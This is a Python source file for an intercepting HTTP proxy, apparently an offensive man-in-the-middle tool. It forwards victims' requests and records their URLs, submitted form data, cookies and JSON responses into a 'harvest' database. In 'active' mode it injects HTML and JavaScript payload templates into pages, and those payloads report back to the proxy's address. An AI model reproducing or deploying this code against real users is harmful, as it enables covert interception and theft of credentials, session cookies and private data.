import sys
import socket
import threading
from concurrent.futures.thread import ThreadPoolExecutor
from concurrent.futures import as_completed
from tools import Debuger
from Harvester import Harvester
from urllib.parse import parse_qs, urlparse
import json
import http
import requests
import os
from bs4 import BeautifulSoup


class Server:
    def __init__(self, hostname="0.0.0.0",
                       port=80,
                       connections=100,
                       verbosity=0,
                       mode="passive",
                       timeout=250):
        self.mode = mode
        self.hostname = hostname
        self.timeout = timeout
        self.port= port
        self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.running = False
        self.workers = []
        self.debuger = Debuger(verbosity)
        self.harvester = Harvester(mode, server_ip=hostname, database="harvest.sqlite")
        self.prepare_injects()
        try:
            self.soc.bind((hostname, port))
            self.soc.listen(connections)
            self.debuger.v_print(1, f"listenting on {hostname}:{port}")
        except socket.error as msg:
            print(f"ERROR:{msg}")
            exit()
    def _get_chunks(self,conn):
        chunks = b""
        while True:
            chunk = conn.recv(4096)
            chunks += chunk
            if len(chunk) <= 4096:
                break
        return chunks

    def _parse_request(self, raw_request):
        request_lines = raw_request.decode(encoding="utf-8").split("\n")
        method = request_lines[0].split(" / ")[0].split()[0]
        url = request_lines[0].split(" ")[1]

        request_length = len(request_lines)
        headers = {}
        h_index = 2

        while h_index < request_length - 1 and request_lines[h_index] != "\r":
            h_name = request_lines[h_index].split(":")[0].strip()
            h_value = request_lines[h_index].replace(f"{h_name}: ", "").strip()
            headers[h_name] = h_value
            h_index += 1

        if request_lines[-2] == "\r" and len(request_lines[-1]) >=0:
            body =  parse_qs(request_lines[-1])
        else:
            body = None
        return {
            "method": method,
            "headers": headers,
            "url": url,
            "data": body
        }


    def _format_headers(self, raw_headers, length=None):

        if length:
            raw_headers["Content-length"] = length

        headers = [f"{header}: {value}" for header, value
                                        in raw_headers.items()]
        return "\n".join(headers)

    def  _decode_body(self, data, encoding):
       try:
           return data.decode(encoding=encoding)
       except:
           return data

    def run_worker(self, conn, addr):
        raw_request = self._get_chunks(conn)
        request = self._parse_request(raw_request)
        self.debuger.v_print(1, f"{addr[0]}:{str(addr[1])} -> {request}")

        if self.hostname in request["url"] or request["url"][0] == "/":
            self.__handle_inject_reply(request["url"], addr[0])
            return;

        prepared_request = requests.Request(**request).prepare()
        self.harvester.harvest_url(request["url"], addr[0])
        self.harvester.harvest_data(request["data"], request["url"], addr[0])

        try:
            if request["headers"]["Cookie"]:
                self.harvester.harvest_cookies(request["headers"]["Cookie"],
                                            request["url"], addr[0])
        except:
            pass
        server_response = requests.Session().send(prepared_request)


        proto = 'HTTP/1.1'
        status_code = server_response.status_code
        status_text = server_response.reason if server_response.reason else ""



        if server_response.encoding is not None:
            encoding = server_response.encoding
            content = self._decode_body(server_response.content, encoding)
            try:
                self.harvester.harvest(server_response.json(), request["url"], addr[0])
            except:
                pass
        else:
            encoding = ""
            content = server_response.content
        if server_response.content:
            self.harvester.harvest_cookies(server_response.cookies,
                                        request["url"], addr[0])




        if(self.mode.lower() == "active"):
            content = self.__inject(content,
            server_response.headers["Content-Type"])


        headers = self._format_headers(server_response.headers, length=len(content))
        head = f"{proto} {status_code} {status_text}\n{headers}\r\n\r\n"
        conn.sendall(head.encode())

        content = content if encoding == "" else content.encode(encoding=encoding)
        conn.sendall(content)
        conn.close()


    def __handle_inject_reply(self, url, ip):
         data = parse_qs(urlparse(url).query)
         self.harvester.add_inject_reply(ip, data)


    def prepare_injects(self):
        self.inject_payloads = {}
        cur_dir = os.path.dirname(__file__)

        for name in ["html", "js"]:
            path = os.path.join(cur_dir,"templates", name)
            try:
                with open(path, "r") as f:
                    self.inject_payloads[name] = f.read().replace("proxy-ip-address",
                                                    f"{self.hostname}:{self.port}")
            except:
                self.inject_payloads[name] = ""

    def __inject(self, content, type):
       if "text/html" in type:
           try:
               self.debuger.v_print(2,"injecting html")
               content = self.__inject_html(content)
               return content
           except Exception as ex:
               self.debuger.v_print(2,"failed to inject html")
               return content
       if "application/javascript" in type or "text/javascript" in type:
           try:
               self.debuger.v_print(2,"injecting html")
               return self.__inject_javascript(content)
           except Exception as ex:
               self.debuger.v_print(2,"failed to inject html")
               return content


    def __inject_javascript(self, server_js):
        server_js += self.injects["js"]
        return server_js


    def __inject_html(self, server_html):
        soup = BeautifulSoup(server_html, 'html.parser')
        html_payload = BeautifulSoup(self.inject_payloads["html"], 'html.parser')

        soup.html.append(html_payload)
        return soup.prettify()

    def start_proxy(self):
        while self.running:
            conn, addr = self.soc.accept()
            worker = threading.Thread(target=self.run_worker,
                                        args=(conn, addr))
            worker.start()
            self.workers.append(worker)

    def get_harvest(self):
        return self.harvester.getAllHarvests()

    def print_harvest(self):
        print(self.harvester)

    def get_inject_replies(self):
        return self.harvester.getAllInjectReply()


    def __del__(self):
        self.running = False
        self.soc.close()

    def start(self):
        self.main_thread = threading.Thread(target=self.start_proxy)
        self.running = True
        self.main_thread.start()

    def stop(self):
        self.debuger.v_print(1,"Stoping Server")
        self.running = False
